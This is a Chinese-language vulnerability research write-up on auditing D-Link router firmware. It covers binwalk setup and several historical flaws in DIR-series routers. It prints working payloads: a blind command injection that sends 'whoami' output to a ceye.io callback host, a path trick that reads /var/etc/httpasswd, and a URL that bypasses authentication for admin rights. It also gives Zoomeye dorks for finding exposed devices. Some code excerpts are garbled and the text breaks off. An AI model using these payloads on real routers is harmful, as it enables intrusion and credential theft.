作者：Sebao@知道创宇404实验室
#### 前言
前几天去上海参加了geekpwn，看着大神们一个个破解成功各种硬件，我只能在下面喊
6666，特别羡慕那些大神们。所以回来就决定好好研究一下路由器，争取跟上大神们的步伐。看网上公开的D-Link系列的漏洞也不少，那就从D-Link路由器漏洞开始学习。
#### 准备工作
既然要挖路由器漏洞，首先要搞到路由器的固件。 D-Link路由器固件下载地址：
下载完固件发现是个压缩包，解压之后里面还是有一个bin文件。听说用binwalk就可以解压。kali-linux自带binwalk，但是缺少一些依赖，所以还是编译安装了一下。
    $ sudo apt-get update  
    $ sudo apt-get install build-essential autoconf git
    # https://github.com/devttys0/binwalk/blob/master/INSTALL.md  
    $ git clone https://github.com/devttys0/binwalk.git  
    $ cd binwalk
    # python2.7安装  
    $ sudo python setup.py install
    # python2.7手动安装依赖库  
    $ sudo apt-get install python-lzma
    $ sudo apt-get install python-crypto
    $ sudo apt-get install libqt4-opengl python-opengl python-qt4 python-qt4-gl python-numpy python-scipy python-pip  
    $ sudo pip install pyqtgraph
    $ sudo apt-get install python-pip  
    $ sudo pip install capstone
    # Install standard extraction utilities（必选）  
    $ sudo apt-get install mtd-utils gzip bzip2 tar arj lhasa p7zip p7zip-full cabextract cramfsprogs cramfsswap squashfs-tools
    # Install sasquatch to extract non-standard SquashFS images（必选）  
    $ sudo apt-get install zlib1g-dev liblzma-dev liblzo2-dev  
    $ git clone https://github.com/devttys0/sasquatch  
    $ (cd sasquatch && ./build.sh)
    # Install jefferson to extract JFFS2 file systems（可选）  
    $ sudo pip install cstruct  
    $ git clone https://github.com/sviehb/jefferson  
    $ (cd jefferson && sudo python setup.py install)
    # Install ubi_reader to extract UBIFS file systems（可选）  
    $ sudo apt-get install liblzo2-dev python-lzo  
    $ git clone https://github.com/jrspruitt/ubi_reader  
    $ (cd ubi_reader && sudo python setup.py install)
    # Install yaffshiv to extract YAFFS file systems（可选）  
    $ git clone https://github.com/devttys0/yaffshiv  
    $ (cd yaffshiv && sudo python setup.py install)
    # Install unstuff (closed source) to extract StuffIt archive files（可选）  
    $ wget -O - http://my.smithmicro.com/downloads/files/stuffit520.611linux-i386.tar.gz | tar -zxv  
    $ sudo cp bin/unstuff /usr/local/bin/
按照上面的命令就可以完整的安装binwalk了，这样就可以解开市面上的大部分固件包。 然后用 `binwalk -Me 固件包名称`
解固件，然后我们会得到以下划线开头的名称的文件夹，文件夹里`squashfs-root`文件夹，就是路由器的完整固件包。
#### 漏洞挖掘
此文章针对历史路由器的web漏洞进行分析，路由器的web文件夹 一般就在`suashfs-root/www`或者 `suashfs-root/htdocs`文件夹里。路由器固件所使用的语言一般为 asp,php,cgi,lua 等语言。这里主要进行php的代码审计来挖掘漏洞。
##### D-Link DIR-645 & DIR-815 命令执行漏洞
**Zoomeye dork:**
[DIR-815](https://www.zoomeye.org/searchResult?q=%20DIR-815&t=all) or
[DIR-645](https://www.zoomeye.org/searchResult?q=%20DIR-645&t=all)
这里以 D-Link DIR-645固件为例，解开固件进入 `suashfs-root/htdocs` 文件夹。
这个漏洞出现在 `diagnostic.php`文件。直接看代码
    HTTP/1.1 200 OK
    Content-Type: text/xml
    \n';
    ?>
分析代码可以看到，这里没有进行权限认证，所以可以直接绕过登录。继续往下看，`set("/runtime/diagnostic/ping",
$_POST["dst"]);` 这段代码就是造成漏洞的关键代码。参数`dst` 没有任何过滤直接进入到了
ping的命令执行里，导致任意命令执行漏洞。继续往下看 `$result =
"OK";`无论是否执行成功，这里都会显示OK。所以这是一个盲注的命令执行。以此构造payload
    url = 'localhost/diagnostic.php'
    data = "act=ping&dst=%26 ping `whoami`.ceye.io%26"
因为是盲注的命令执行，所以这里需要借助一个盲打平台（如：[ceye](http://ceye.io/)），来验证漏洞是否存在。
##### D-Link DIR-300 & DIR-320 & DIR-600 & DIR-615 信息泄露漏洞
**Zoomeye
dork:**[DIR-300](https://www.zoomeye.org/searchResult?q=%20DIR-300&t=all) or
[DIR-600](https://www.zoomeye.org/searchResult?q=%20DIR-600&t=all)
这里以 D-Link DIR-300固件为例，解开固件进入 `suashfs-root/www` 文件夹。
漏洞出现在`/model/__show_info.php`文件。
    404 Not Found\n";
        echo "404 Not Found\n";
    }
    else
    {
        if($REQUIRE_FILE!="")
        {
            require($LOCALE_PATH."/".$REQUIRE_FILE);
        }
        else
        {
            echo $m_context;
            echo $m_context2;//jana added
            if($m_context_next!="")
            {
                echo $m_context_next;
            }
            echo "\n";
            if($USE_BUTTON=="1")
            {echo "\n"; }
        }
    }
    ?>
这里看到已经禁止了`$REQUIRE_FILE`的参数为`var/etc/httpasswd`和`var/etc/hnapasswd`。这么一看无法获取账号密码。但是我们可以从根路径开始配置`httpasswd`的路径，就可以绕过这个过滤了。
payload：
    localhost/model/__show_info.php?REQUIRE_FILE=/var/etc/httpasswd
这里设置`REQUIRE_FILE=/var/etc/httpasswd` 成功绕过上面的 if判断，进行任意文件读取。
##### D-Link DIR-300 & DIR-320 & DIR-615 权限绕过漏洞
**Zoomeye
dork:**[DIR-300](https://www.zoomeye.org/searchResult?q=%20DIR-300&t=all) or
[DIR-615](https://www.zoomeye.org/searchResult?q=%20DIR-615&t=all)
这里以 D-Link DIR-300固件为例，解开固件进入 `suashfs-root/www` 文件夹
默认情况下，Web界面中的所有页面都需要进行身份验证，但是某些页面（如 登录页面） 必须在认证之前访问。
为了让这些页面不进行认证，他们设置了一个PHP变量NO_NEED_AUTH：
此漏洞触发的原因在于 全局文件 `_html_head.php`。
这里我们看到 `$NO_NEED_AUTH!="1"` 如果 `$NO_NEED_AUTH` 不为 1
则进入身份认证。如果我们把`$NO_NEED_AUTH`值 设置为 1 那就绕过了认证进行任意操作。
payload：
`localhost/bsc_lan.php?NO_NEED_AUTH=1&AUTH_GROUP=0`
这里`AUTH_GROUP=0` 表示admin权限
##### D-Link DIR-645 信息泄露漏洞
**Zoomeye
dork:**[DIR-645](https://www.zoomeye.org/searchResult?q=%20DIR-645&t=all)
这里以 D-Link DIR-300固件为例，解开固件进入 `suashfs-root/htdocs` 文件夹
D-Link DIR-645 `getcfg.php` 文件由于过滤不严格导致信息泄露漏洞。
    $SERVICE_COUNT = cut_count($_POST["SERVICES"], ",");
    TRACE_debug("GETCFG: got ".$SERVICE_COUNT." service(s): ".$_POST["SERVICES"]);
    $SERVICE_INDEX = 0;
    while ($SERVICE_INDEX 
  * 
  * 
  * 
* * *